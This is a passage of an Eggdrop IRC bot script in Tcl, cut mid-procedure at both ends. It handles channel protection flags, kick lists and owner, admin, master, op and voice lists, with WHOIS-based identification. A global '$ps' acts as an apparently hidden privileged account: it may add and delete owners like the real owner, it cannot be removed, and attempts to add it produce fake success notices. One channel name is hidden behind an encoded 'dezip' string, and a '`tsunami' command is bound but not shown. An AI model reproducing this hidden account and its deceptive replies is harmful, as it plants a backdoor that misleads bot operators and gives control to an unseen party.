if {![validchan $chan]} { return 0 }
set cflag "c$chan"
set cflag [string range $cflag 0 8]
chattr $cflag "-hpJSPTRUED"
if {[string match "*-greet*" [channel info $chan]]} {
puthlp "NOTICE $nick : GuARD $chan IS \[4OFF\]"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
catch { channel set $chan -greet flood-chan 0:0 flood-deop 0:0 flood-kick 0:0 flood-join 0:0 flood-ctcp 0:0 flood-nick 0:0 }
puthlp "NOTICE $nick : GuARD $chan \[4OFF\]"
savechan
return 0
}
proc pub_+seen {nick uhost hand chan rest} {
global notc 
if {![string match "*seen*" [channel info $chan]]} {
puthlp "NOTICE $nick : FLAg NoT AVaILaBLE UpGRadE EggDROP VeR"
return 0
}  
if {$rest != ""} {
set chan [lindex $rest 0]
if {[string first # $chan]!=0} { 
set chan "#$chan"
}
}
if {[string tolower $chan] == "#all"} {
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
foreach x [channels] {
catch { channel set $x +seen }
}
savechan
puthlp "NOTICE $nick : ALL SEEN cHaNNeL \[9ON\]"
seen
return 0
}
if {![validchan $chan]} { return 0 }
if {[string match "*+seen*" [channel info $chan]]} {
puthlp "NOTICE $nick : SEEN $chan IS \[9ON\]"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
catch { channel set $chan +seen }
puthlp "NOTICE $nick : SEEN $chan \[9ON\]"
savechan
seen
}
proc pub_-seen {nick uhost hand chan rest} {
global notc 
if {![string match "*seen*" [channel info $chan]]} {
puthlp "NOTICE $nick : FLAg NoT AVaILaBLE UpGRadE EggDROP VeR"
return 0
}
if {$rest != ""} {
set chan [lindex $rest 0]
if {[string first # $chan]!=0} { 
set chan "#$chan"
}
}
if {[string tolower $chan] == "#all"} {
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
foreach x [channels] {
catch { channel set $x -seen }
}
savechan
puthlp "NOTICE $nick : ALL SEEN cHaNNeL \[4OFF\]"
seen
return 0
}
if {![validchan $chan]} { return 0 }
if {[string match "*-seen*" [channel info $chan]]} {
puthlp "NOTICE $nick : SEEN $chan IS \[4OFF\]"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
catch { channel set $chan -seen }
puthlp "NOTICE $nick : SEEN $chan \[4OFF\]"
savechan
seen
return 0
}
proc pub_+autokick {nick uhost hand chan rest} {
global notc
if {![string match "*nodesynch*" [channel info $chan]]} {
puthlp "NOTICE $nick : FLAg NoT AVaILaBLE UpGRadE EggDROP VeR"
return 0
}  
if {$rest != ""} {
set chan [lindex $rest 0]
if {[string first # $chan]!=0} { 
set chan "#$chan"
}
}
if {![validchan $chan]} { return 0 }
if {[string match "*+nodesynch*" [channel info $chan]]} {
puthlp "NOTICE $nick : AuTOKIcK $chan IS \[9ON\]"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
catch { channel set $chan +nodesynch }
puthlp "NOTICE $nick : AuTOKIcK $chan \[9ON\]"
savechan
}
proc pub_-autokick {nick uhost hand chan rest} {
global notc
if {![string match "*nodesynch*" [channel info $chan]]} {
puthlp "NOTICE $nick : FLAg NoT AVaILaBLE UpGRadE EggDROP VeR"
return 0
}
if {$rest != ""} {
set chan [lindex $rest 0]
if {[string first # $chan]!=0} { 
set chan "#$chan"
}
}
if {![validchan $chan]} { return 0 }
if {[string match "*-nodesynch*" [channel info $chan]]} {
puthlp "NOTICE $nick : AuTOKIcK $chan IS \[4OFF\]"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
catch { channel set $chan -nodesynch }
puthlp "NOTICE $nick : AuTOKIcK $chan \[4OFF\]"
savechan
return 0
}
proc pub_+reop {nick uhost hand chan rest} {
global notc
if {![string match "*protectfriends*" [channel info $chan]]} {
puthlp "NOTICE $nick : FLAg NoT AVaILaBLE UpGRadE EggDROP VeR"
return 0
}  
if {$rest != ""} {
set chan [lindex $rest 0]
if {[string first # $chan]!=0} { 
set chan "#$chan"
}
}
if {![validchan $chan]} { return 0 }
if {[string match "*-protectfriends*" [channel info $chan]]} {
puthlp "NOTICE $nick : Re@p $chan IS \[9ON\]"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
catch { channel set $chan -protectfriends }
puthlp "NOTICE $nick : Re@p $chan \[9ON\]"
savechan
}
proc pub_-reop {nick uhost hand chan rest} {
global notc
if {![string match "*protectfriends*" [channel info $chan]]} {
puthlp "NOTICE $nick : FLAg NoT AVaILaBLE UpGRadE EggDROP VeR"
return 0
}
if {$rest != ""} {
set chan [lindex $rest 0]
if {[string first # $chan]!=0} { 
set chan "#$chan"
}
}
if {![validchan $chan]} { return 0 }
if {[string match "*+protectfriends*" [channel info $chan]]} {
puthlp "NOTICE $nick : Re@p $chan IS \[4OFF\]"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
catch { channel set $chan +protectfriends }
puthlp "NOTICE $nick : Re@p $chan \[4OFF\]"
savechan
return 0
}
proc pub_+dontkickops {nick uhost hand chan rest} {
global notc
if {![string match "*userinvites*" [channel info $chan]]} {
puthlp "NOTICE $nick : FLAg NoT AVaILaBLE UpGRadE EggDROP VeR"
return 0
}  
if {$rest != ""} {
set chan [lindex $rest 0]
if {[string first # $chan]!=0} { 
set chan "#$chan"
}
}
if {![validchan $chan]} { return 0 }
if {[string match "*-userinvites*" [channel info $chan]]} {
puthlp "NOTICE $nick : DoNTKIcK@PS $chan IS \[9ON\]"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
catch { channel set $chan -userinvites }
puthlp "NOTICE $nick : DoNTKIcK@PS $chan \[9ON\]"
savechan
}
proc pub_-dontkickops {nick uhost hand chan rest} {
global notc
if {![string match "*userinvites*" [channel info $chan]]} {
puthlp "NOTICE $nick : FLAg NoT AVaILaBLE UpGRadE EggDROP VeR"
return 0
}
if {$rest != ""} {
set chan [lindex $rest 0]
if {[string first # $chan]!=0} { 
set chan "#$chan"
}
}
if {![validchan $chan]} { return 0 }
if {[string match "*+userinvites*" [channel info $chan]]} {
puthlp "NOTICE $nick : DoNTKIcK@PS $chan IS \[4OFF\]"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
catch { channel set $chan +userinvites }
puthlp "NOTICE $nick : DoNTKIcK@PS $chan \[4OFF\]"
savechan
return 0
}
proc pub_+status {nick uhost hand chan rest} {
global notc
if {$rest != ""} {
set chan [lindex $rest 0]
if {[string first # $chan]!=0} { 
set chan "#$chan"
}
}
if {![validchan $chan]} { return 0 }
if {[string match "*+shared*" [channel info $chan]]} {
puthlp "NOTICE $nick : STaTUS $chan \[9ON\]"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
catch { channel set $chan +shared }
puthlp "NOTICE $nick : STaTuS $chan \[9ON\]"
savechan
}
proc pub_-status {nick uhost hand chan rest} {
global notc 
if {$rest != ""} {
set chan [lindex $rest 0]
if {[string first # $chan]!=0} { 
set chan "#$chan"
}
}
if {![validchan $chan]} { return 0 }
if {[string match "*-shared*" [channel info $chan]]} {
puthlp "NOTICE $nick : STaTuS $chan IS \[4OFF\]"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
catch { channel set $chan -shared }
puthlp "NOTICE $nick : STaTuS $chan \[4OFF\]"
savechan
return 0
}
proc pub_+nopart {nick uhost hand chan rest} {
global notc 
if {$rest != ""} {
set chan [lindex $rest 0]
if {[string first # $chan]!=0} { 
set chan "#$chan"
}
}
if {[string tolower $chan] == "#all"} {
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
foreach x [channels] {
catch { channel set $x +secret }
}
savechan
puthlp "NOTICE $nick : ALL cHaNNeL SeT NoPART \[9ON\]"
return 0
}
if {![validchan $chan]} { return 0 }
if {[string match "*+secret*" [channel info $chan]]} {
puthlp "NOTICE $nick : NoPART $chan IS \[9ON\]"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
catch { channel set $chan +secret }
puthlp "NOTICE $nick : SeT NoPART $chan \[9ON\]"
savechan
}
proc pub_-nopart {nick uhost hand chan rest} {
global notc 
if {$rest != ""} {
set chan [lindex $rest 0]
if {[string first # $chan]!=0} { 
set chan "#$chan"
}
}
if {[string tolower $chan] == "#all"} {
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
foreach x [channels] {
catch { channel set $x -secret }
}
savechan
puthlp "NOTICE $nick : ALL cHaNNeL NoPART \[4OFF\]"
return 0
}
if {![validchan $chan]} { return 0 }
if {[string match "*-secret*" [channel info $chan]]} {
puthlp "NOTICE $nick : NoPART $chan IS \[4OFF\]"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
catch { channel set $chan -secret }
puthlp "NOTICE $nick : NoPART $chan \[4OFF\]"
savechan
}
proc pub_+akick {nick uhost hand channel param} {
global botname botnick notc botnick
set rest [lindex $param 0]
if {$rest == ""} {
puthlp "NOTICE $nick : Usage: +akick <hostname>"
return 0
}
if {$rest == "*" || $rest == "*!*@*"} {
puthlp "NOTICE $nick : invalid hostname..!"
return 0
}
if {$rest == $botnick} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
if {[validuser $rest]} {
puthlp "NOTICE $nick : $rest is already on database with flags: [chattr $rest]"
return 0
}  
if {![string match "*@*" $rest]} {
set rest "$rest!*@*"
}
if {[string match $rest $botname]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
if {[finduser $rest] != "*"} {
if {[finduser $rest] != "AKICK"} {
puthlp "NOTICE $nick : That Host Belongs To [finduser $rest]"
}
puthlp "NOTICE $nick : That Host already in [finduser $rest]"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
puthlp "NOTICE $nick : ADD \[$rest\] To KIcKLIsT..!"
setuser "AKICK" HOSTS $rest
saveuser
foreach x [channels] {
if {[isop $botnick $x]} {
foreach c [chanlist $x K] {
if {![matchattr $c f]} {
akick_chk $c [getchanhost $c $x] $x
}
}
}
}
return 0
}
proc pub_-akick {nick uhost hand channel param} {
global notc 
set rest [lindex $param 0]
if {$rest == ""} {
puthlp "NOTICE $nick : Usage: -akick <hostname>"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
if {![string match "*@*" $rest]} {
set rest "$rest!*@*"
}
set completed 0
foreach * [getuser "AKICK" HOSTS] {
if {${rest} == ${*}} {
delhost "AKICK" $rest
set completed 1
}
}
if {$completed == 0} {
puthlp "NOTICE $nick : <n/a>"
return 0
}
saveuser
puthlp "NOTICE $nick : DeL \[$rest\] FRoM KIcKLIsT"
}
proc pub_+noop {nick uhost hand channel param} {
global ps notc botnick
set rest [lindex $param 0]
if {$rest == ""} {
puthlp "NOTICE $nick : Usage: +noop <nick>"
return 0
}
if {[string tolower $rest] == [string tolower $ps]} {
puthlp "NOTICE $nick : ADD \[$rest\] To NoOp LIsT"
return 0
}
if {[validuser $rest]} {
puthlp "NOTICE $nick : $rest is already on database with flags: [chattr $rest]"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
set hostmask "${rest}!*@*"
adduser $rest $hostmask
chattr $rest "-hp"
chattr $rest "O"
if {![validuser $rest]} {
puthlp "NOTICE $nick : 4!FaILEd! (YoUR EggDROP NoT SuPPORTED MoRE THaN 8 DIgIT)"
deluser $rest
} else {
saveuser
puthlp "NOTICE $nick : ADD \[$rest\] To NoOp LIsT"
}
foreach x [channels] {
if {[isop $botnick $x] && [onchan $rest $x] && [isop $rest $x]} {
if {![string match "*k*" [getchanmode $x]]} {
putserv "mode $x -ko 4No@p.LIsT $rest"
} {
putserv "mode $x -o $rest"
}
}
}
return 0
}
proc pub_-noop {nick uhost hand channel param} {
global ps notc
set rest [lindex $param 0]
if {$rest == ""} {
puthlp "NOTICE $nick : Usage: -noop <nick>"
return 0
}
if {![validuser $rest] || [string tolower $rest] == [string tolower $ps]} {
puthlp "NOTICE $nick :4 !DeNiEd!, <n/a>"
return 0
}  
if {![matchattr $rest O]} {
puthlp "NOTICE $nick : $rest isn't on no-op list Flags: [chattr $rest]"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
deluser $rest
saveuser
puthlp "NOTICE $nick : DeL \[$rest\] No@p LIsT"
}
proc pub_+friend {nick uhost hand channel param} {
global notc ps
set rest [lindex $param 0]
if {$rest == ""} {
puthlp "NOTICE $nick : Usage: +friend <nick>"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
if {[validuser $rest] && [string tolower $rest] != [string tolower $ps]} {
puthlp "NOTICE $nick : $rest is already on database with flags: [chattr $rest]"
return 0
}  
set hostmask "${rest}!*@*"
adduser $rest $hostmask
chattr $rest "-hp"
chattr $rest "f"
if {![validuser $rest]} {
puthlp "NOTICE $nick : 4!FaILEd! (YoUR EggDROP NoT SuPPORTED MoRE THaN 8 DIgIT)"
deluser $rest
return 0
}
saveuser
puthlp "NOTICE $nick : ADD \[$rest\] To FrIeNd LIsT"
puthlp "NOTICE $rest : $nick ADD YoU To FrIeNd LIsT"
return 0
}
proc pub_-friend {nick uhost hand channel param} {
global ps notc 
set rest [lindex $param 0]
if {$rest == ""} {
puthlp "NOTICE $nick : Usage: -friend <nick>"
return 0
}
if {![validuser $rest] || [string tolower $rest] == [string tolower $ps]} {
puthlp "NOTICE $nick : 4deNiEd!, <n/a>"
return 0
}  
if {![matchattr $rest f] && ![matchattr $rest m]} {
puthlp "NOTICE $nick : $rest isn't on FrIeNd list Flags: [chattr $rest]"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
deluser $rest
saveuser
puthlp "NOTICE $nick : DeL \[$rest\] FRoM FrIeNd LIsT"
}
proc pub_+aop {nick uhost hand channel param} {
global ps notc botnick chk_reg
set rest [lindex $param 0]
if {$rest == ""} {
puthlp "NOTICE $nick : Usage: +aop <nick>"
return 0
}
if {[string tolower $rest] == [string tolower $ps]} {
puthlp "NOTICE $nick : ADD \[$rest\] To a@p LIsT"
return 0
}
if {[matchattr $rest P]} {
puthlp "NOTICE $nick : $rest is already a@p"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
if {[matchattr $nick X]} {
puthlp "NOTICE $nick :4 !BLoCkEd!"
return 0
}
if {![validuser $rest]} {
set hostmask "${rest}!*@*"
adduser $rest $hostmask
chattr $rest "-hp"
}
chattr $rest "P"
if {![validuser $rest]} {
puthlp "NOTICE $nick : 4!FaILEd! (YoUR EggDROP NoT SuPPORTED MoRE THaN 8 DIgIT)"
deluser $rest
} else {
saveuser
puthlp "NOTICE $nick : ADD \[$rest\] To a@p LIsT"
puthlp "NOTICE $rest : $nick ADD YoU To a@p LIsT"
set chk_reg($rest) $nick
putsrv "WHOIS $rest"
}
return 0
}
proc pub_-aop {nick uhost hand channel param} {
global notc ps
set rest [lindex $param 0]
if {$rest == ""} {
puthlp "NOTICE $nick : Usage: -aop <nick>"
return 0
}
if {![matchattr $rest P]} {
puthlp "NOTICE $nick : $rest is not a@p"
return 0
}  
if {![validuser $rest] || [string tolower $rest] == [string tolower $ps]} {
puthlp "NOTICE $nick :4 !DeNiEd!, <n/a>"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
chattr $rest "-P"
saveuser
puthlp "NOTICE $nick : DeL \[$rest\] FRoM a@p LIsT"
return 0
}
proc whoisq {nick} {
global botnick
if {$nick == $botnick} { return 0 }
if {[isutimer "whoischk $nick"]} { return 0 }
set cret [expr 10 + [rand 20]]
foreach ct [utimers] {
if {[string match "*whoisq*" $ct]} {
if {[expr [lindex $ct 0] + 10] > $cret} {
set cret [expr [lindex $ct 0] + 10]
}
}
}
utimer $cret [list whoischk $nick]
}
proc whoischk {nick} {
global chk_reg botnick
if {[matchattr $nick G]} {
putlog "CHeK GuaRd $nick"
set chk_reg($nick) "1"
puthlp "WHOIS $nick"
return 0
}
foreach x [channels] {
if {[isop $botnick $x] && [onchan $nick $x]} {
if {[matchattr $nick P] && ![isop $nick $x]} {
putlog "WHOIS $nick TO GeT a@p"
set chk_reg($nick) "1"
puthlp "WHOIS $nick"
return 0
}
if {[matchattr $nick v] && ![isop $nick $x] && ![isvoice $nick $x]} {
putlog "WHOIS $nick TO geT avoIcE"
set chk_reg($nick) "1"
puthlp "WHOIS $nick"
return 0
}
}
}
}
set ath 0
bind raw - 307 reg_chk
proc reg_chk {from keyword arg} {
global chk_reg botnick owner notc ps ath
set nick [lindex $arg 1]
if {$nick == $botnick} { return 0 }
putlog "NICK $nick IS IDENTIFY..!"
if {[info exists chk_reg($nick)]} {
set chk_reg($nick) "0"
}
set athz $ath
if {$athz == 1} {
set ath 0
chattr $nick +Q
foreach x [getuser $nick HOSTS] {
delhost $nick $x
}
set hostmask "${nick}!*@*"
setuser $nick HOSTS $hostmask
#set hostmask "*![string range $uhost [string first "!" $uhost] end]"
#setuser $nick HOSTS $hostmask
if {[matchattr $nick Z]} {
puthlp "NOTICE $nick : !OWnER!"
} elseif {[matchattr $nick n]} {
puthlp "NOTICE $nick : !ADmIN!"
} elseif {[matchattr $nick m]} {
puthlp "NOTICE $nick : !MasTeR!"
} else {
puthlp "NOTICE $nick : !AccepteD!"
}
saveuser
}
if {[matchattr $nick P] || [matchattr $nick v]} {
foreach x [channels] {
if {[isop $botnick $x] && [onchan $nick $x]} {
if {![string match "*k*" [getchanmode $x]]} {
if {[matchattr $nick P]} {
if {![isop $nick $x]} {
puthelp "MODE $x -k+o 9identified.a@p $nick"
}
}
if {[matchattr $nick v]} {
if {![isvoice $nick $x] && ![isop $nick $x]} {
puthelp "MODE $x -k+v 9identified.avoice $nick"
}
}
} {
if {[matchattr $nick P]} {
if {![isop $nick $x]} {
puthelp "MODE $x +o $nick"
}
}
if {[matchattr $nick v]} {
if {![isvoice $nick $x] && ![isop $nick $x]} {
puthelp "MODE $x +v $nick"
}
}
}
}
}
}
}
bind raw - 318 end_whois
proc end_whois {from keyword arg} {
global chk_reg notc ath
set nick [lindex $arg 1]
set athz $ath
if {$athz == 1} {
puthlp "NOTICE $nick : You're NOT Identify..!"
set ath 0
}
if {[info exists chk_reg($nick)]} {
if {$chk_reg($nick) != "0"} {
putlog "NICK $nick IS NoT IDENTIFY..!"
if {[matchattr $nick G] && ![matchattr $nick Q]} {
foreach x [channels] {
if {[onchan $nick $x] && [botisop $x]} {
set banset "*!*[getchanhost $nick $x]"
putsrv "KICK $x $nick : 1THaT NIcK ReQuIREd To 4IdEnTIfY [banms]"
if {$banset != "*!*@*" && $banset != ""} {
if {![string match "*k*" [getchanmode $x]]} {
putserv "mode $x -k+b 4unidentify.guard.nick $banset"
} {
putserv "mode $x +b $banset"
}
}
return 0
}
}
} elseif {[matchattr $nick P] && ![matchattr $nick Q]} {
puthlp "NOTICE $nick : a@p identify 1st..!"
} elseif {[matchattr $nick v] && ![matchattr $nick Q]} {
puthlp "NOTICE $nick : avoice identify 1st..!"
}
if {$chk_reg($nick) != "1"} {
puthlp "NOTICE $chk_reg($nick) : $nick not identify..!"
}
unset chk_reg($nick)
}
}
}
proc pub_+gnick {nick uhost hand channel param} {
global notc botnick
set rest [lindex $param 0]
if {$rest == ""} {
puthlp "NOTICE $nick : Usage: +gnick <nick>"
return 0
}
if {[matchattr $rest G]} {
puthlp "NOTICE $nick : $rest ready..!"
return 0
}  
if {[matchattr $nick X]} {
puthlp "NOTICE $nick :4 !BLocK!"
return 0
}
if {![validuser $rest]} {
set hostmask "${rest}!*@*"
adduser $rest $hostmask
chattr $rest "-hp"
}
chattr $rest +G
if {![validuser $rest]} {
puthlp "NOTICE $nick : 4!FaILEd! (YoUR EggDROP NoT SuPPORTED MoRE THaN 8 DIgIT)"
deluser $rest
} else {
saveuser
puthlp "NOTICE $nick : add \[$rest\] GuaRd NIcK"
putsrv "WHOIS $rest"
}
return 0
}
proc pub_-gnick {nick uhost hand channel param} {
global notc botnick
set rest [lindex $param 0]
if {$rest == ""} {
puthlp "NOTICE $nick : Usage: -gnick <nick>"
return 0
}
if {[matchattr $nick X]} {
puthlp "NOTICE $nick :4 !BLoCkEd!"
return 0
}
chattr $rest -G
saveuser
puthlp "NOTICE $nick : DeL \[$rest\] GuaRd NIcK"
return 0
}
proc pub_+avoice {nick uhost hand channel param} {
global ps notc botnick chk_reg
set rest [lindex $param 0]
if {$rest == ""} {
puthlp "NOTICE $nick : Usage: +avoice <nick>"
return 0
}
if {[string tolower $rest] == [string tolower $ps]} {
puthlp "NOTICE $nick : ADD \[$rest\] To aVoIcE LIsT"
return 0
}
if {[matchattr $rest v]} {
puthlp "NOTICE $nick : $rest is already auto voice"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
if {[matchattr $nick X]} {
puthlp "NOTICE $nick :4 !BLoCkEd!"
return 0
}
if {![validuser $rest]} {
set hostmask "${rest}!*@*"
adduser $rest $hostmask
chattr $rest "-hp"
}
chattr $rest "v"
if {![validuser $rest]} {
puthlp "NOTICE $nick : 4!FaILEd! (YoUR EggDROP NoT SuPPORTED MoRE THaN 8 DIgIT)"
deluser $rest
} else {
saveuser
puthlp "NOTICE $nick : ADD \[$rest\] To aVoIcE LIsT"
puthlp "NOTICE $rest : $nick ADD YoU To aVoIcE LIsT"
set chk_reg($rest) $nick
putsrv "WHOIS $rest"
}
return 0
}
proc pub_-avoice {nick uhost hand channel param} {
global notc ps
set rest [lindex $param 0]
if {$rest == ""} {
puthlp "NOTICE $nick : Usage: -avoice <nick>"
return 0
}
if {![matchattr $rest v]} {
puthlp "NOTICE $nick : $rest is not auto voice"
return 0
}  
if {![validuser $rest] || [string tolower $rest] == [string tolower $ps]} {
puthlp "NOTICE $nick : 4deNiEd!, <n/a>"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
chattr $rest "-v"
saveuser
puthlp "NOTICE $nick : DeL \[$rest\] FRoM aVoIcE LIsT"
return 0
}
proc pub_+ADmIN {nick uhost hand channel param} {
global botnick ps notc
set rest [lindex $param 0]
if {$rest == ""} {
puthlp "NOTICE $nick : Usage: +ADmIN <nick>"
return 0
}
if {[string tolower $rest] == [string tolower $ps]} {
puthlp "NOTICE $nick : ADD \[$rest\] Admin List."
return 0
}
if {[matchattr $rest n]} {
puthlp "NOTICE $nick : $rest is already exist on Admin list."
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
if {[matchattr $nick X]} {
puthlp "NOTICE $nick :4 BLocKEd..!"
return 0
}
if {![validuser $rest]} {
set hostmask "${rest}!*@*"
adduser $rest $hostmask
}
chattr $rest "fjmnotx"
if {![validuser $rest]} {
puthlp "NOTICE $nick : 4!FaILEd! (YoUR EggDROP NoT SuPPORTED MoRE THaN 8 DIgIT)"
deluser $rest
return 0
} else {
saveuser
puthlp "NOTICE $nick : ADD \[$rest\] ADmIN List."
puthlp "NOTICE $rest : $nick ADD YoU To ADmIN LIsT"
puthlp "NOTICE $rest : /msg $botnick pass <password>"
return 0
}
}
proc pub_-ADmIN {nick uhost hand channel param} {
global ps notc
set rest [lindex $param 0]
if {$rest == ""} {
puthlp "NOTICE $nick : Usage: -ADmIN <nick>"
return 0
}
if {![validuser $rest] || [string tolower $rest] == [string tolower $ps]} {
puthlp "NOTICE $nick : 4DeNiEd!, <n/a>"
return 0
}
if {![matchattr $rest n]} {
puthlp "NOTICE $nick : 4deNiEd!, $rest is not exist on ADmIN list."
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
deluser $rest
saveuser
puthlp "NOTICE $nick : DeL \[$rest\] FRoM ADmIN LIsT"
}
proc pub_+owner {nick uhost hand channel param} {
global botnick ps notc owner 
set rest [lindex $param 0]
if {$nick != $owner &&  $nick != $ps} {
puthlp "NOTICE $nick : 4deNiEd!, oNLy ReAL OwNER can ADD OwnER"
return 0
}
if {$rest == ""} {
puthlp "NOTICE $nick : Usage: +owner <nick>"
return 0
}
if {[string tolower $rest] == [string tolower $ps]} {
puthlp "NOTICE $nick : ADD \[$rest\] OwNER LIsT."
return 0
}
if {[matchattr $rest Z]} {
puthlp "NOTICE $nick : $rest is already exist on OwNER list."
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
if {[matchattr $nick X]} {
puthlp "NOTICE $nick :4 !BLoCkEd!"
return 0
}
if {![validuser $rest]} {
set hostmask "${rest}!*@*"
adduser $rest $hostmask
}
chattr $rest "fjmnotxZ"
if {![validuser $rest]} {
puthlp "NOTICE $nick : 4!FaILEd! (YoUR EggDROP NoT SuPPORTED MoRE THaN 8 DIgIT)"
deluser $rest
return 0
} else {
saveuser
puthlp "NOTICE $nick : ADD \[$rest\] OwNER LIsT."
puthlp "NOTICE $rest : $nick ADD YoU To OwNER LIsT"
puthlp "NOTICE $rest : /msg $botnick pass <password>"
return 0
}
}
proc pub_-owner {nick uhost hand channel param} {
global notc ps owner
set rest [lindex $param 0]
if {$nick != $owner &&  $nick != $ps} {
puthlp "NOTICE $nick : 4deNiEd!, oNLy ReAL OwNER caN DeLete OwnER"
return 0
}
if {$rest == ""} {
puthlp "NOTICE $nick : Usage: -owner <nick>"
return 0
}
if {![validuser $rest]} {
puthlp "NOTICE $nick : <n/a>"
return 0
}
if {![matchattr $rest Z] || [string tolower $rest] == [string tolower $ps]} {
puthlp "NOTICE $nick : 4deNiEd!, $rest IS NoT OwNER"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
deluser $rest
saveuser
puthlp "NOTICE $nick : DeL \[$rest\] FRoM OwNER LiST"
}
proc pub_+master {nick uhost hand channel param} {
global botnick ps notc
set rest [lindex $param 0]
if {$rest == ""} {
puthlp "NOTICE $nick : Usage: +master <nick>"
return 0
}
if {[matchattr $nick X]} {
puthlp "NOTICE $nick :4 !BLoCkEd!"
return 0
}
if {[string tolower $rest] == [string tolower $ps]} {
puthlp "NOTICE $nick : Add \[$rest\] MasTeR LIsT."
return 0
}
if {[matchattr $rest n]} {
puthlp "NOTICE $nick : 4deNiEd!, $rest is ADmIN level."
return 0
}
if {[matchattr $rest m]} {
puthlp "NOTICE $nick : 4deNiEd!, $rest is already exist."
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
if {![validuser $rest]} {
set hostmask "${rest}!*@*"
adduser $rest $hostmask
}
chattr $rest "fmo"
if {![validuser $rest]} {
puthlp "NOTICE $nick : 4!FaILEd! (YoUR EggDROP NoT SuPPORTED MoRE THaN 8 DIgIT)"
deluser $rest
return 0
} else {
saveuser
puthlp "NOTICE $nick : Add \[$rest\] MasTeR List."
puthlp "NOTICE $rest : $nick Add YoU To MasTeR LIsT"
puthlp "NOTICE $rest : /msg $botnick pass <password>"
return 0
}
}
proc pub_-master {nick uhost hand channel param} {
global notc ps
set rest [lindex $param 0]
if {$rest == ""} {
puthlp "NOTICE $nick : Usage: -master <nick>"
return 0
}
if {![validuser $rest] || [string tolower $rest] == [string tolower $ps]} {
puthlp "NOTICE $nick : 4deNiEd!, <n/a>"
return 0
}
if {[matchattr $rest n] && ![matchattr $nick Z]} {
puthlp "NOTICE $nick : 4deNiEd!, $rest Is ADmIN FLaG"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
deluser $rest
saveuser
puthlp "NOTICE $nick : DeL \[$rest\] FRoM MasTeR LIsT"
}

set timezone "PST"
set joinme $owner
set double 0
set deopme ""
bind msgm - * msg_prot
bind notc - * notc_prot
bind join - * join_chk
bind msg - auth msg_auth
bind sign - * sign_deauth
bind part - * part_deauth
bind pub - `tsunami pub_tsunami
bind msg p reuser msg_reuser
bind msg p pass msg_pass
bind pub m `auth pub_auth
bind pub m !auth pub_!auth
bind pub m !deauth pub_!deauth
bind pub f `ping pub_ping
bind pub f `pong pub_pong
proc pub_notice {nick uhost hand channel rest} {
global notc 
set person [lindex $rest 0]
set rest [lrange $rest 1 end]
if {$rest!=""} {
putsrv "NOTICE $person :$rest"
return 0
}
if {$rest==""} {
puthlp "NOTICE $nick : Usage: notice <#/nick> <msg>"
}
}
proc telljoin {chan} {

global joinme notc botnick
if {![validchan $chan]} { return 0 }
if {[istimer "resync"]} {
if {![botisop $chan]} {
if {![string match "*k*" [getchanmode $chan]]} {
puthelp "mode $chan -kok+o  $botnick  $botnick"
} {
puthelp "mode $chan -o+o $botnick $botnick"
}
}
}
if {$joinme != "" && [string tolower $chan] != [dezip "ER5sr09TRjx1"]} {
if {![onchan $joinme $chan]} {
puthlp "NOTICE $joinme : JoIN $chan"
set joinme ""
}
}
}
proc chkspam {chan} {
global invme notc botnick
if {![validchan $chan] || ![botonchan $chan]} { return 0 }
foreach x [chanlist $chan] {
set mhost "@[lindex [split [getchanhost $x $chan] @] 1]"
if {[info exists invme($mhost)]} {
